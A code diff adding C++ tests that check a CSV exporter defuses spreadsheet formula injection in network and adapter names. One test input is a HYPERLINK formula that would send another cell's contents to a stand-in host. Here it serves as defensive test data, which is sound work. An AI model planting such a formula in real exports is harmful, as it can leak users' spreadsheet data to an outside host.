@@ -48,6 +48,34 @@ TEST_CASE("CsvEscape quotes CR and LF") {
     CHECK(CsvEscape("a\r\nb") == "\"a\r\nb\"");
 }
 
+TEST_CASE("CsvTextField neutralises text a spreadsheet would run as a formula") {
+    CHECK(CsvTextField(R"(=HYPERLINK("//x.y/"&B2))") == R"x("'=HYPERLINK(""//x.y/""&B2)")x");
+    CHECK(CsvTextField("-Home") == "'-Home");
+    CHECK(CsvTextField("+1 555") == "'+1 555");
+    CHECK(CsvTextField("@SUM(A1)") == "'@SUM(A1)");
+    CHECK(CsvTextField("\tTab") == "'\tTab");
+    CHECK(CsvTextField("\rCR") == "\"'\rCR\"");   // the CR still needs RFC 4180 quoting
+    CHECK(CsvTextField("Home") == "Home");
+    CHECK(CsvTextField("Home-5G = fast") == "Home-5G = fast");   // only the first character matters
+    CHECK(CsvTextField("Home, 5G") == "\"Home, 5G\"");
+    CHECK(CsvTextField("") == "");
+}
+
+TEST_CASE("ExportCsv neutralises formulas in names but not in the numbers" * doctest::test_suite("integration")) {
+    TempDir d; UsageStore st; REQUIRE(st.Open(d.dir / L"usage.db") == UsageStore::OpenResult::Ok);
+    auto tz = *TimeZone::FromKey(L"Pacific Standard Time");
+    st.UpsertAdapter(L"{A}", L"-Adapter", AdapterKind::WiFi);
+    st.UpsertNetwork({L"{N}", LR"(=HYPERLINK("//x.y/"&B2))"});
+    UsageRow r{UtcOf(2026, 10, 18, 15), Series::Adapter, L"{A}", L"{N}", 1234, 56};
+    st.AddUsage(std::span<const UsageRow>(&r, 1));
+
+    const auto file = d.dir / L"out.csv";
+    REQUIRE(ExportCsv(file, st, {UtcOf(2026, 10, 18, 7), UtcOf(2026, 10, 19, 7)}, tz));
+    const std::string s = ReadAll(file);
+    CHECK(s.find("2026-10-18 08:00,hour,adapter,{A},'-Adapter,wifi,\"'=HYPERLINK(\"\"//x.y/\"\"&B2)\",1234,56\r\n") !=
+          std::string::npos);
+}
+
 TEST_CASE("ExportCsv writes UTF-8 with BOM" * doctest::test_suite("integration")) {
     TempDir d; UsageStore st; REQUIRE(st.Open(d.dir / L"usage.db") == UsageStore::OpenResult::Ok);
     auto tz = *TimeZone::FromKey(L"Pacific Standard Time");
